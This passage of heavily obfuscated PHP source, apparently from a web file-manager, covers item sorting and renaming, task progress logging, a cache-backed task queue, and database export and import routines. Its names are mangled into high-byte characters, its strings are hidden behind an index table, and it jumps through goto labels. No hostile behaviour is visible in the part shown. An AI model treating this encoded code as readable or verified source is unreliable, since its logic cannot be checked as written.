$êê¦³¹ƒ, $Ù¾ŞĞÍ÷[472] => $È®Û£ƒ); if ($this->where($ºİú§ÁŠ)->find()) { return !1; } $ºİú§ÁŠ = array($Ù¾ŞĞÍ÷[1657] => USER_ID, $Ù¾ŞĞÍ÷[535] => 0); $ØÛ—ÀÉË = $this->where($ºİú§ÁŠ)->max($Ù¾ŞĞÍ÷[1888]); if (!$ØÛ—ÀÉË) { $ØÛ—ÀÉË = 0; } if (!$Ö’ãóÜğ && $êê¦³¹ƒ == $Ù¾ŞĞÍ÷[467]) { $”¥ä­ğØ = Model($Ù¾ŞĞÍ÷[1352])->where(array($Ù¾ŞĞÍ÷[468] => $È®Û£ƒ))->find(); if (!$”¥ä­ğØ) { return !1; } $Ö’ãóÜğ = $”¥ä­ğØ[$Ù¾ŞĞÍ÷[32]]; } $Ö’ãóÜğ = $this->getAutoName($Ö’ãóÜğ); $ç¯ˆø¦ = array($Ù¾ŞĞÍ÷[1657] => USER_ID, $Ù¾ŞĞÍ÷[535] => 0, $Ù¾ŞĞÍ÷[471] => $Ö’ãóÜğ, $Ù¾ŞĞÍ÷[472] => $È®Û£ƒ, $Ù¾ŞĞÍ÷[473] => $êê¦³¹ƒ, $Ù¾ŞĞÍ÷[1868] => $ØÛ—ÀÉË + 1); return $this->add($ç¯ˆø¦); } protected function remove($‹‹˜§Ä) { $íÄ‚°‘² =& $_SERVER[–Ú¬çÁ]; $Ñù¤€ğ„ = array($íÄ‚°‘²[1657] => USER_ID, $íÄ‚°‘²[470] => $‹‹˜§Ä); return $this->where($Ñù¤€ğ„)->delete(); } protected function removeByName($­øéæÑ„) { $¹ï‚¥Šà =& $_SERVER[–Ú¬çÁ]; $ô¾Ò«Œ¾ = array($¹ï‚¥Šà[1657] => USER_ID, $¹ï‚¥Šà[471] => $­øéæÑ„, $¹ï‚¥Šà[535] => 0); return $this->where($ô¾Ò«Œ¾)->delete(); } protected function rename($˜–ğÛûÈ, $Á·˜ÜÓã) { $¿Æ¥Š‰† =& $_SERVER[–Ú¬çÁ]; if ($˜–ğÛûÈ == $Á·˜ÜÓã) { return !1; } $Å–«Øî´ = $this->getAutoName($Á·˜ÜÓã); if ($Á·˜ÜÓã != $Å–«Øî´) { return !1; } $Ã¸İ¯œ¤ = array($¿Æ¥Š‰†[1657] => USER_ID, $¿Æ¥Š‰†[535] => 0, $¿Æ¥Š‰†[32] => $˜–ğÛûÈ); return $this->where($Ã¸İ¯œ¤)->save(array($¿Æ¥Š‰†[32] => $Á·˜ÜÓã)); } protected function resetSort($Ï¥Ğ³‡ë) { $êáìîì =& $_SERVER[–Ú¬çÁ]; $Ï¥Ğ³‡ë = is_array($Ï¥Ğ³‡ë) ? $Ï¥Ğ³‡ë : array(); $ÈÆßô›ú = array($êáìîì[1657] => USER_ID); for ($öîØ•ç = 0; $öîØ•ç < count($Ï¥Ğ³‡ë); $öîØ•ç++) { $ÈÆßô›ú[$êáìîì[470]] = $Ï¥Ğ³‡ë[$öîØ•ç]; $this->where($ÈÆßô›ú)->save(array($êáìîì[1868] => $öîØ•ç + 1)); } return !0; } protected function moveTop($æÜ½ Øì) { $èëÈ¶Ç˜ =& $_SERVER[–Ú¬çÁ]; $ƒôÙÖ·ˆ = array($èëÈ¶Ç˜[1657] => USER_ID, $èëÈ¶Ç˜[535] => 0); $•ÂñÏÈ× = $this->where($ƒôÙÖ·ˆ)->where(array($èëÈ¶Ç˜[32] => $æÜ½ Øì))->find(); if (!$•ÂñÏÈ×) { return; } $šÀúü°„ = $this->field($èëÈ¶Ç˜[452])->where($ƒôÙÖ·ˆ)->order($èëÈ¶Ç˜[2315])->select(); $šÀúü°„ = array_to_keyvalue($šÀúü°„, $èëÈ¶Ç˜[12], $èëÈ¶Ç˜[452]); $‰ïÃÈ‘ = $šÀúü°„; $šÀúü°„ = array_remove_value($šÀúü°„, $•ÂñÏÈ×[$èëÈ¶Ç˜[452]]); array_unshift($šÀúü°„, $•ÂñÏÈ×[$èëÈ¶Ç˜[452]]); return $this->resetSort($šÀúü°„); } protected function moveBottom($ïéÛÂ¸) { $£ËÂœš =& $_SERVER[–Ú¬çÁ]; $µ¯Ÿ¯î = array($£ËÂœš[1657] => USER_ID, $£ËÂœš[535] => 0); $üÅ¿ªÖè = $this->where($µ¯Ÿ¯î)->max($£ËÂœš[1888]); $ŸÁà™±Ğ = array($£ËÂœš[1888] => $üÅ¿ªÖè + 1); return $this->where($µ¯Ÿ¯î)->where(array($£ËÂœš[32] => $ïéÛÂ¸))->save($ŸÁà™±Ğ); } private function getAutoName($ö“´ß¨û) { $Š¢œØ° =& $_SERVER[–Ú¬çÁ]; $ãßØªÏ¯ = array($Š¢œØ°[1657] => USER_ID, $Š¢œØ°[535] => 0); $ş¦¬ÃšÄ = $this->field($Š¢œØ°[32])->where($ãßØªÏ¯)->select(); $ş¦¬ÃšÄ = array_to_keyvalue($ş¦¬ÃšÄ, $Š¢œØ°[12], $Š¢œØ°[32]); if (!$ş¦¬ÃšÄ || !in_array($ö“´ß¨û, $ş¦¬ÃšÄ)) { return $ö“´ß¨û; } for ($´‹½¾Ûº = 0; $´‹½¾Ûº < count($ş¦¬ÃšÄ); $´‹½¾Ûº++) { if (!in_array($ö“´ß¨û . "\50{$´‹½¾Ûº}\51", $ş¦¬ÃšÄ)) { return $ö“´ß¨û . "\50{$´‹½¾Ûº}\51"; } } return $ö“´ß¨û . "\x28{$´‹½¾Ûº}\x29"; } } goto e¶÷ãé±šÚ; BÑ×ê ªÑ‘: class TaskHttp extends Task { protected function startAfter() { $âÆ•„÷‰ =& $_SERVER[–Ú¬çÁ]; $ÒŞÔïô¿ =& $this->task; $ÒŞÔïô¿[$âÆ•„÷‰[1743]] = 1; Hook::bind($âÆ•„÷‰[1711], array($this, $âÆ•„÷‰[1744])); Hook::bind($âÆ•„÷‰[1713], array($this, $âÆ•„÷‰[1745])); Hook::bind($âÆ•„÷‰[1715], array($this, $âÆ•„÷‰[1746])); } protected function endAfter() { $Ÿ…ë©˜ =& $_SERVER[–Ú¬çÁ]; Hook::unbind($Ÿ…ë©˜[1711], array($this, $Ÿ…ë©˜[1744])); Hook::unbind($Ÿ…ë©˜[1713], array($this, $Ÿ…ë©˜[1745])); Hook::unbind($Ÿ…ë©˜[1715], array($this, $Ÿ…ë©˜[1746])); } public function progressStart($É‹¢Ä¹«) { $õ—Áø»ô =& $_SERVER[–Ú¬çÁ]; $í÷«¨‹Ø = curl_getinfo($É‹¢Ä¹«); self::log($õ—Áø»ô[1747] . $í÷«¨‹Ø[$õ—Áø»ô[360]]); self::valueSet($this->task[$õ—Áø»ô[452]], $this->task); } public function progressEnd($å†¬áÌÁ) { $ûõ™ÀØ =& $_SERVER[–Ú¬çÁ]; self::log($ûõ™ÀØ[1748] . $this->task[$ûõ™ÀØ[452]]); $this->end(); } public function progress($í“‚óê¬, $Ş±ÈˆŒõ, $Û¤±ã¦õ, $˜ùœ–ú, $¼€‰çÛš) { $šĞÛ÷¡ =& $_SERVER[–Ú¬çÁ]; $‹–Ô±‰© =& $this->task; if ($¼€‰çÛš > 0) { $‹–Ô±‰©[$šĞÛ÷¡[806]] = $‹–Ô±‰©[$šĞÛ÷¡[806]] == 0 ? $˜ùœ–ú : $‹–Ô±‰©[$šĞÛ÷¡[806]]; $‹–Ô±‰©[$šĞÛ÷¡[1667]] = $¼€‰çÛš; } else { if ($Û¤±ã¦õ > 0) { $‹–Ô±‰©[$šĞÛ÷¡[806]] = $‹–Ô±‰©[$šĞÛ÷¡[806]] == 0 ? $Ş±ÈˆŒõ : $‹–Ô±‰©[$šĞÛ÷¡[806]]; $‹–Ô±‰©[$šĞÛ÷¡[1667]] = $Û¤±ã¦õ; } } $this->update(); self::log("\x70\x72\x6f\x67\x72\145\163\x73\x48\x74\164\160\72\144\x6f\167\x6e\x3a{$Û¤±ã¦õ}\x2f{$Ş±ÈˆŒõ}\x3b\x20\x75\160\154\x6f\141\144\x3a{$¼€‰çÛš}\57{$˜ùœ–ú}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¼ıÁÁ¼Æ, $¹Ûå­œ = '', $û–”¸ˆ = 0, $óòÏğòî = '') { $âöÌÅï³ =& $_SERVER[–Ú¬çÁ]; $®ªİ™ û = new Task($¼ıÁÁ¼Æ, $¹Ûå­œ, $û–”¸ˆ, $óòÏğòî); $GLOBALS[$âöÌÅï³[1749] . $¼ıÁÁ¼Æ] = new TaskLog($âöÌÅï³[1650], $®ªİ™ û, $óòÏğòî); return $®ªİ™ û; } public function __construct($ ğñêÂ = '', $ĞÈ”âœ = '', $Î×¥˜¼ó = '') { $Ìµ·Â¬¹ =& $_SERVER[–Ú¬çÁ]; if (!$ ğñêÂ) { $ ğñêÂ = $Ìµ·Â¬¹[1650]; } $ºÑ¦¿ = $ ğñêÂ . $Ìµ·Â¬¹[439] . rand_string(10); if (!$Î×¥˜¼ó) { $Î×¥˜¼ó = $ ğñêÂ . $Ìµ·Â¬¹[53] . $Î×¥˜¼ó; } switch ($ ğñêÂ) { case $Ìµ·Â¬¹[1650]: if (!$ĞÈ”âœ || !$ĞÈ”âœ->task) { return echoLog($ ğñêÂ . $Ìµ·Â¬¹[1750]); } $çÀ©ø¼„ = $ĞÈ”âœ; $ºÑ¦¿ = $çÀ©ø¼„->task[$Ìµ·Â¬¹[452]]; $ ğñêÂ = $çÀ©ø¼„->task[$Ìµ·Â¬¹[452]]; if (!$çÀ©ø¼„->task[$Ìµ·Â¬¹[1561]]) { $çÀ©ø¼„->task[$Ìµ·Â¬¹[1561]] = $Î×¥˜¼ó ? $Î×¥˜¼ó : $ ğñêÂ; } break; case $Ìµ·Â¬¹[1751]: if (!$ĞÈ”âœ) { return echoLog($ ğñêÂ . $Ìµ·Â¬¹[1752]); } $Ì¿œ€ú… = is_string($ĞÈ”âœ) ? array($ĞÈ”âœ) : $ĞÈ”âœ; $çÀ©ø¼„ = new TaskFileTransfer($ºÑ¦¿, $ ğñêÂ, 0, $Î×¥˜¼ó ? $Î×¥˜¼ó : $Ì¿œ€ú…[0]); foreach ($Ì¿œ€ú… as $êã¾å‚) { $çÀ©ø¼„->addPath($êã¾å‚); } break; case $Ìµ·Â¬¹[366]: if (!$ĞÈ”âœ) { return echoLog($ ğñêÂ . $Ìµ·Â¬¹[1752]); } $Ì¿œ€ú… = is_string($ĞÈ”âœ) ? array($ĞÈ”âœ) : $ĞÈ”âœ; $çÀ©ø¼„ = new TaskZip($ºÑ¦¿, $ ğñêÂ, 0, $Î×¥˜¼ó ? $Î×¥˜¼ó : $Ì¿œ€ú…[0]); foreach ($Ì¿œ€ú… as $êã¾å‚) { $çÀ©ø¼„->addPath($êã¾å‚); } break; case $Ìµ·Â¬¹[1234]: if (!$ĞÈ”âœ) { return echoLog($ ğñêÂ . $Ìµ·Â¬¹[1752]); } $çÀ©ø¼„ = new TaskUnZip($ºÑ¦¿, $ ğñêÂ, 0, $Î×¥˜¼ó ? $Î×¥˜¼ó : $ĞÈ”âœ); if ($ĞÈ”âœ) { $çÀ©ø¼„->addFile($ĞÈ”âœ); } break; case $Ìµ·Â¬¹[149]: $çÀ©ø¼„ = new TaskHttp($ºÑ¦¿, $ ğñêÂ); break; default: return; break; } $this->task = $çÀ©ø¼„; $this->taskID = $ºÑ¦¿; Hook::bind($Ìµ·Â¬¹[1687], array($this, $Ìµ·Â¬¹[1753])); Hook::bind($Ìµ·Â¬¹[1689], array($this, $Ìµ·Â¬¹[1754])); Hook::bind($Ìµ·Â¬¹[1683], array($this, $Ìµ·Â¬¹[1755])); echoLog($Ìµ·Â¬¹[1756] . $çÀ©ø¼„->task[$Ìµ·Â¬¹[1561]]); } public function __destruct() { $this->end(); } public function end($÷à£îÅ© = '') { $Ş½‘å•ù =& $_SERVER[–Ú¬çÁ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($÷à£îÅ©); $this->task = !1; $this->taskID = !1; Hook::unbind($Ş½‘å•ù[1687], array($this, $Ş½‘å•ù[1753])); Hook::unbind($Ş½‘å•ù[1689], array($this, $Ş½‘å•ù[1754])); Hook::unbind($Ş½‘å•ù[1683], array($this, $Ş½‘å•ù[1755])); } public function taskUpdate($†„û‡§µ) { $Œı”ıó =& $_SERVER[–Ú¬çÁ]; if (!$†„û‡§µ || $this->taskID != $†„û‡§µ[$Œı”ıó[452]]) { return; } $º‚ãä = 20; $¢©€”¯¬ = intval($†„û‡§µ[$Œı”ıó[1668]] * $º‚ãä); $­”½Ô = $Œı”ıó[163] . str_repeat($Œı”ıó[904], $¢©€”¯¬) . $Œı”ıó[1034] . str_repeat($Œı”ıó[53], $º‚ãä - $¢©€”¯¬) . $Œı”ıó[165]; $È²Å”è = $­”½Ô . sprintf($Œı”ıó[1757], $†„û‡§µ[$Œı”ıó[1668]] * 100) . $Œı”ıó[1758]; $ºåì‚º¸ = $È²Å”è . $†„û‡§µ[$Œı”ıó[1667]] . $Œı”ıó[8] . $†„û‡§µ[$Œı”ıó[806]] . LNG($Œı”ıó[1759]); $À¿©òÛ = $Œı”ıó[12]; if ($†„û‡§µ[$Œı”ıó[1743]]) { $ºåì‚º¸ = $È²Å”è . size_format($†„û‡§µ[$Œı”ıó[1667]]) . $Œı”ıó[8] . size_format($†„û‡§µ[$Œı”ıó[806]]); $À¿©òÛ = size_format($†„û‡§µ[$Œı”ıó[1669]]) . $Œı”ıó[1760]; } if ($†„û‡§µ[$Œı”ıó[1084]]) { $†„û‡§µ[$Œı”ıó[1717]] = $†„û‡§µ[$Œı”ıó[1084]] . $Œı”ıó[53] . $†„û‡§µ[$Œı”ıó[1717]]; } if ($†„û‡§µ[$Œı”ıó[1717]]) { $¸¹âî¥‰ = $Œı”ıó[12]; if ($†„û‡§µ[$Œı”ıó[1719]]) { $¸¹âî¥‰ = $Œı”ıó[50] . size_format($†„û‡§µ[$Œı”ıó[1720]]) . $Œı”ıó[8] . size_format($†„û‡§µ[$Œı”ıó[1719]]); } $À¿©òÛ .= $†„û‡§µ[$Œı”ıó[1717]] . $¸¹âî¥‰; } if ($†„û‡§µ[$Œı”ıó[783]] && !$†„û‡§µ[$Œı”ıó[1719]]) { $À¿©òÛ .= $Œı”ıó[53] . size_format($†„û‡§µ[$Œı”ıó[1724]]) . $Œı”ıó[8] . size_format($†„û‡§µ[$Œı”ıó[783]]); } echoLog($ºåì‚º¸ . $Œı”ıó[53] . $À¿©òÛ, !0); } public function taskEnd($œ¹ıã†) { $¢áÍÆÈ =& $_SERVER[–Ú¬çÁ]; if (!$œ¹ıã† || $this->taskID != $œ¹ıã†[$¢áÍÆÈ[452]]) { return; } $Ìë’Óš· = $œ¹ıã† ? $œ¹ıã†[$¢áÍÆÈ[1667]] . $¢áÍÆÈ[8] . $œ¹ıã†[$¢áÍÆÈ[806]] . LNG($¢áÍÆÈ[1759]) . $¢áÍÆÈ[71] : $¢áÍÆÈ[12]; echoLog($¢áÍÆÈ[1761] . $œ¹ıã†[$¢áÍÆÈ[1561]] . ($œ¹ıã†[$¢áÍÆÈ[503]] ? $¢áÍÆÈ[71] . $œ¹ıã†[$¢áÍÆÈ[503]] : $¢áÍÆÈ[12]) . $¢áÍÆÈ[71] . $Ìë’Óš· . $¢áÍÆÈ[1762] . sprintf($¢áÍÆÈ[871], timeFloat() - $œ¹ıã†[$¢áÍÆÈ[1670]]) . $¢áÍÆÈ[1682]); $this->end(); } public function taskKill($æË©ß„½) { $¤ÅúºŸ =& $_SERVER[–Ú¬çÁ]; if (!$æË©ß„½ || $this->taskID != $æË©ß„½[$¤ÅúºŸ[452]]) { return; } echoLog($¤ÅúºŸ[1763] . $æË©ß„½[$¤ÅúºŸ[1561]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\153\x51\165\x65\165\145\x4c\145\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\163\x6b\x51\x75\x65\x75\145\104\x61\x74\141"; const QUEUE_TIME = "\164\x61\163\x6b\x51\165\x65\165\145\x4c\141\163\164\x52\x75\156"; const QUEUE_THREAD = "\164\x61\163\153\x51\x75\145\x75\145\124\150\162\x65\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÖƒÙÌ¼, $Øâ—Ÿ‘ñ = array(), $ıŸí¾Š£ = '', $İ¬º ¦ô = '') { $±µÀÀôî =& $_SERVER[–Ú¬çÁ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($İ¬º ¦ô && array_find_by_field(self::$listData, $±µÀÀôî[94], $İ¬º ¦ô)) { return !0; } if ($İ¬º ¦ô && array_find_by_field(self::$listDataAdd, $±µÀÀôî[94], $İ¬º ¦ô)) { return !0; } self::$listDataAdd[] = array($±µÀÀôî[317] => $ÖƒÙÌ¼, $±µÀÀôî[1764] => $Øâ—Ÿ‘ñ, $±µÀÀôî[503] => $ıŸí¾Š£, $±µÀÀôî[94] => $İ¬º ¦ô); return !0; } public static function addSubmit() { $±û©şƒ =& $_SERVER[–Ú¬çÁ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($±û©şƒ[1765] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $±û©şƒ[12], $±û©şƒ[503])), $±û©şƒ[185]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ĞùÆ…Ì©, $§Ÿúè×ş = array(), $¸•‘¿İá = '', $Í­ËĞ¥º = '') { $ŒÉ‹ªò® =& $_SERVER[–Ú¬çÁ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‹ÎÓ¶ÑĞ = self::getAll(); if ($Í­ËĞ¥º && array_find_by_field($‹ÎÓ¶ÑĞ, $ŒÉ‹ªò®[94], $Í­ËĞ¥º)) { return !0; } $‹ÎÓ¶ÑĞ[] = array($ŒÉ‹ªò®[317] => $ĞùÆ…Ì©, $ŒÉ‹ªò®[1764] => $§Ÿúè×ş, $ŒÉ‹ªò®[503] => $¸•‘¿İá, $ŒÉ‹ªò®[94] => $Í­ËĞ¥º); self::setAll($‹ÎÓ¶ÑĞ); write_log($ŒÉ‹ªò®[1765] . $¸•‘¿İá, $ŒÉ‹ªò®[185]); return !0; } public static function run() { $Êó÷ğğ =& $_SERVER[–Ú¬çÁ]; $Ùƒ¼äã  = self::getAll(); $¨ã¥‰„ç = array_shift($Ùƒ¼äã ); if (!$¨ã¥‰„ç) { return !1; } self::setAll($Ùƒ¼äã ); $¤¨‚üñ = timeFloat(); $«ÒÓŠÛ = $Êó÷ğğ[12]; try { $«ÒÓŠÛ = Hook::apply($¨ã¥‰„ç[$Êó÷ğğ[317]], $¨ã¥‰„ç[$Êó÷ğğ[1764]]); } catch (Exception $£ÁâøÍ) { write_log($£ÁâøÍ, $Êó÷ğğ[1202]); } $úÆ—ö¢Ú = number_format(timeFloat() - $¤¨‚üñ, 3) . $Êó÷ğğ[1682]; if ($«ÒÓŠÛ && is_string($«ÒÓŠÛ)) { $úÆ—ö¢Ú = $úÆ—ö¢Ú . $Êó÷ğğ[1766] . $«ÒÓŠÛ; } write_log($Êó÷ğğ[1767] . $¨ã¥‰„ç[$Êó÷ğğ[503]] . $Êó÷ğğ[1768] . $úÆ—ö¢Ú, $Êó÷ğğ[185]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $±Î‡í±š =& $_SERVER[–Ú¬çÁ]; $Ë¹ÇŒÍ = self::threadCount() + 1; if ($Ë¹ÇŒÍ > 3 || !self::count()) { return; } write_log($±Î‡í±š[1769] . $Ë¹ÇŒÍ, $±Î‡í±š[185]); Cache::set(self::QUEUE_THREAD, $Ë¹ÇŒÍ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($±Î‡í±š[1770], $±Î‡í±š[185]); } public static function getKey($í€Ê±éğ, $¾Ç¥öñ¼ = "\151\156\x74") { $Î¾âˆö· =& $_SERVER[–Ú¬çÁ]; Cache::removeMemory($í€Ê±éğ); $ÏÙ÷³Î = Cache::get($í€Ê±éğ); if ($¾Ç¥öñ¼ == $Î¾âˆö·[341]) { return $ÏÙ÷³Î ? intval($ÏÙ÷³Î) : 0; } if ($¾Ç¥öñ¼ == $Î¾âˆö·[1771]) { return is_array($ÏÙ÷³Î) ? $ÏÙ÷³Î : array(); } return $ÏÙ÷³Î; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[–Ú¬çÁ][1771]); } public static function setAll($Ó‘ÓÖÑû) { $ò½ç±£Ë = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ó‘ÓÖÑû), $ò½ç±£Ë); Cache::set(self::QUEUE_DATA, $Ó‘ÓÖÑû, $ò½ç±£Ë); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto A¸ ¹‹ÖŞ·; b¹İù…Ğ’Ñ: define($_SERVER[–Ú¬çÁ][291], 1); define($_SERVER[–Ú¬çÁ][292], 2); define($_SERVER[–Ú¬çÁ][293], 3); goto B–¡‰‹äğ¾; cØÈÊµÏˆÕ: class DbManage { function __construct($è‡€í”× = array()) { $™ÍÌ‰ğ =& $_SERVER[–Ú¬çÁ]; if (empty($è‡€í”×)) { $è‡€í”× = $GLOBALS[$™ÍÌ‰ğ[6]][$™ÍÌ‰ğ[21]]; } $this->database = $è‡€í”×; } public function model($Œ«çÊÇ = '') { return new ModelBase($Œ«çÊÇ, $_SERVER[–Ú¬çÁ][12], $this->database); } public function db($¯Ú¡¥Û¢ = false) { $­º …• =& $_SERVER[–Ú¬çÁ]; $³ò¯ûıë = array_change_key_case($this->database); if ($this->dbType() == $­º …•[13] || !$¯Ú¡¥Û¢) { return $this->model()->db(); } $ìû“Ş±Õ = $³ò¯ûıë[$­º …•[992]]; $³ò¯ûıë[$­º …•[992]] = $­º …•[12]; if ($³ò¯ûıë[$­º …•[987]] == $­º …•[984]) { $•à´¯É€ = $³ò¯ûıë[$­º …•[993]]; $³ò¯ûıë[$­º …•[993]] = substr($•à´¯É€, 0, strrpos($•à´¯É€, $­º …•[1079])); } $this->database = $³ò¯ûıë; $ª¡Ù¾şÏ = $this->model()->db(); try { $ıÙÈ°Ü = $ª¡Ù¾şÏ->execute("\x73\150\x6f\167\40\144\141\x74\x61\x62\x61\163\x65\163\40\x6c\x69\153\x65\x20\x27{$ìû“Ş±Õ}\47"); } catch (Exception $¢±’è») { } if (!$ıÙÈ°Ü) { $ª¡Ù¾şÏ->execute("\x63\162\145\x61\164\x65\x20\144\x61\164\141\x62\x61\163\x65\x20\140{$ìû“Ş±Õ}\x60"); } $³ò¯ûıë[$­º …•[992]] = $ìû“Ş±Õ; if ($³ò¯ûıë[$­º …•[987]] == $­º …•[984]) { $³ò¯ûıë[$­º …•[993]] .= $­º …•[1079] . $ìû“Ş±Õ; } $this->database = $³ò¯ûıë; $ª¡Ù¾şÏ->execute("\165\x73\x65\x20\x60{$ìû“Ş±Õ}\140"); return $ª¡Ù¾şÏ; } public function createTable($ï‘Ï‘…, &$Â©’ıˆ) { $û°›åÎú =& $_SERVER[–Ú¬çÁ]; if (!IO::exist($ï‘Ï‘…)) { ActionCall($û°›åÎú[1080], !0, 0); show_json(LNG($û°›åÎú[1081]), !1); } $›İ•¸ = $this->model()->db(); $âª¼À§Ò = sqlSplit(IO::getContent($ï‘Ï‘…)); foreach ($âª¼À§Ò as $¢Á²†õØ) { $˜áÕ„¶­ = stripos($¢Á²†õØ, $û°›åÎú[1082]) === 0; if ($˜áÕ„¶­) { $Â©’ıˆ->task[$û°›åÎú[806]] += 1; } $›İ•¸->execute($¢Á²†õØ); if ($˜áÕ„¶­) { preg_match($û°›åÎú[1083], $¢Á²†õØ, $Çõ‰ş¨); $Â©’ıˆ->task[$û°›åÎú[1084]] = $Çõ‰ş¨[1]; $Â©’ıˆ->update(1); } } } public function insertTable($ÁšË¡ìÌ, &$ıìÛïö–) { $¿’èâ¸ =& $_SERVER[–Ú¬çÁ]; $È’İØûº = $this->model()->db(); $‘ ”şıá = $¤ëª¤•´ ? array($¤ëª¤•´) : $È’İØûº->getTables(); foreach ($ÁšË¡ìÌ as $ÙÕ½‡½¡) { $¤ëª¤•´ = basename($ÙÕ½‡½¡, $¿’èâ¸[808]); if (!in_array($¤ëª¤•´, $‘ ”şıá)) { continue; } $ıìÛïö–->task[$¿’èâ¸[1084]] = $¤ëª¤•´; if (get_filesize($ÙÕ½‡½¡) == 0) { continue; } $Üû¿¾ª­ = $this->sqlToDb($ÙÕ½‡½¡, $ıìÛïö–); if (!$Üû¿¾ª­) { ActionCall($¿’èâ¸[1080], !0, 0); show_json(LNG($¿’èâ¸[1085]) . "\133{$¤ëª¤•´}\135", !1); } } } public function sqlFromDb($•¼éé‹½, $†å–››±, &$ ãÕ„‘Ù, $Í¤éŠªÎ = '') { if ($ ãÕ„‘Ù) { $ ãÕ„‘Ù->task[$_SERVER[–Ú¬çÁ][1084]] = $•¼éé‹½; } $’¨å‡°½ = $this->model($•¼éé‹½); $§ÍÙùÄÇ = 0; $ É†é´ò = 0; $ü€‚²¬Ä = 10000; $è˜ÇŞ¯¦ = fopen($†å–››±, $_SERVER[–Ú¬çÁ][1086]); $Î²Üß = $’¨å‡°½->getPk(); $ÃáæµÙÉ = $’¨å‡°½->getDbFields(); $°ªÉ™Õİ = $_SERVER[–Ú¬çÁ][12]; if ($GLOBALS[$_SERVER[–Ú¬çÁ][807]] && in_array($•¼éé‹½, array($_SERVER[–Ú¬çÁ][1087], $_SERVER[–Ú¬çÁ][1088]))) { $°ªÉ™Õİ = $•¼éé‹½; } do { $§íß¼ñ’ = array($Î²Üß => array($_SERVER[–Ú¬çÁ][1034], $ É†é´ò)); $ÆİÀÅ¶Ì = $’¨å‡°½->where($§íß¼ñ’)->field($ÃáæµÙÉ)->order($Î²Üß . $_SERVER[–Ú¬çÁ][1089])->limit($ü€‚²¬Ä)->select(); $ÆİÀÅ¶Ì = !empty($ÆİÀÅ¶Ì) ? $ÆİÀÅ¶Ì : array(); if (!($¢½Ü™ˆ… = count($ÆİÀÅ¶Ì))) { break; } $Û˜Û¬×û = end($ÆİÀÅ¶Ì); $ É†é´ò = $Û˜Û¬×û[$Î²Üß]; $µÙ°ü˜ = array(); foreach ($ÆİÀÅ¶Ì as $Üó…Ê³¦) { if ($°ªÉ™Õİ) { if ($•¼éé‹½ == $_SERVER[–Ú¬çÁ][1087]) { if ($Üó…Ê³¦[$_SERVER[–Ú¬çÁ][33]] == $_SERVER[–Ú¬çÁ][1090]) { $„ÈÖç’Õ = json_decode($Üó…Ê³¦[$_SERVER[–Ú¬çÁ][427]], !0); if ($„ÈÖç’Õ[$_SERVER[–Ú¬çÁ][32]] == $GLOBALS[$_SERVER[–Ú¬çÁ][807]] && $„ÈÖç’Õ[$_SERVER[–Ú¬çÁ][770]] != 1) { continue; } } } else { if ($Üó…Ê³¦[$_SERVER[–Ú¬çÁ][33]] == $_SERVER[–Ú¬çÁ][1091] && $Üó…Ê³¦[$_SERVER[–Ú¬çÁ][94]] == $_SERVER[–Ú¬çÁ][799]) { continue; } } } if ($Í¤éŠªÎ) { $Üó…Ê³¦[$_SERVER[–Ú¬çÁ][84]] = "\173\x69\157\x3a{$Í¤éŠªÎ}\x7d" . substr($Üó…Ê³¦[$_SERVER[–Ú¬çÁ][84]], strlen("\x7b\x69\157\72{$Üó…Ê³¦[$_SERVER[–Ú¬çÁ][837]]}\x7d")); $Üó…Ê³¦[$_SERVER[–Ú¬çÁ][837]] = $Í¤éŠªÎ; } $µÙ°ü˜[] = $_SERVER[–Ú¬çÁ][1092] . $this->sqlEncode($Üó…Ê³¦) . $_SERVER[–Ú¬çÁ][1093]; } $€¼Ø»Ş = "\x49\x4e\123\x45\x52\124\x20\x49\116\x54\117\40\140{$•¼éé‹½}\140\x20\x28\x60" . implode($_SERVER[–Ú¬çÁ][1094], $ÃáæµÙÉ) . $_SERVER[–Ú¬çÁ][1095]; fwrite($è˜ÇŞ¯¦, $€¼Ø»Ş . implode($_SERVER[–Ú¬çÁ][1096], $µÙ°ü˜) . $_SERVER[–Ú¬çÁ][71] . PHP_EOL); $§ÍÙùÄÇ += $¢½Ü™ˆ…; if ($ ãÕ„‘Ù) { $ ãÕ„‘Ù->update($¢½Ü™ˆ…); } } while ($ü€‚²¬Ä == $¢½Ü™ˆ…); fclose($è˜ÇŞ¯¦); return $§ÍÙùÄÇ; } public function sqlToDb($Ğ°å¯³¯, &$«ˆ²ƒÇ‘) { $æ²Ó°í½ =& $_SERVER[–Ú¬çÁ]; $Œ‹ã¬† = $this->model()->db(); $¼ßË²«‚ = @fopen($Ğ°å¯³¯, $æ²Ó°í½[1097]); if (!$¼ßË²«‚) { return !1; } $·Òß¯¶÷ = 0; $üÙƒ’÷ó = $æ²Ó°í½[12]; $á‘ÇÇë¹ = array(); $Ê¿€‡¥ = $this->dbType(); $•¶ÎüÀÊ = $Ê¿€‡¥ == $æ²Ó°í½[13] ? 500 : 2000; $¶ª÷Ìœô = basename($Ğ°å¯³¯, $æ²Ó°í½[808]); $¯„Š×œ = 0; $®†íÍ«± = 4194304 - 104858; $•Ø©‚Œê = 1000000 - 104858; while 